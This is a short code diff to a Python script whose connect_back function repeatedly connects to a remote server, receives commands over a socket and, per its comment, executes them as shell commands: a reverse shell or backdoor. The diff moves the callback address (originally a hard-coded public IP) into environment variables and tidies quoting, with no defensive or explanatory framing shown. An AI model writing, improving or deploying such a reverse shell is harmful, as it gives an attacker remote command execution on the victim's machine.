@@ -1,9 +1,10 @@
 import socket
 import subprocess
 import time
+import os
 
-SERVER_IP = "52.22.11.146"  # This will be set by the environment variable
-SERVER_PORT = 1234
+SERVER_IP = os.getenv('SERVER_IP', '192.168.11.146')
+SERVER_PORT = int(os.getenv('SERVER_PORT', 1234))
 
 def connect_back():
     while True:
@@ -14,7 +15,7 @@ def connect_back():
 
             while True:
                 command = s.recv(1024).decode()
-                if command.lower() in ("exit", "quit"):
+                if command.lower() in ('exit', 'quit'):
                     break
 
                 # Execute shell command
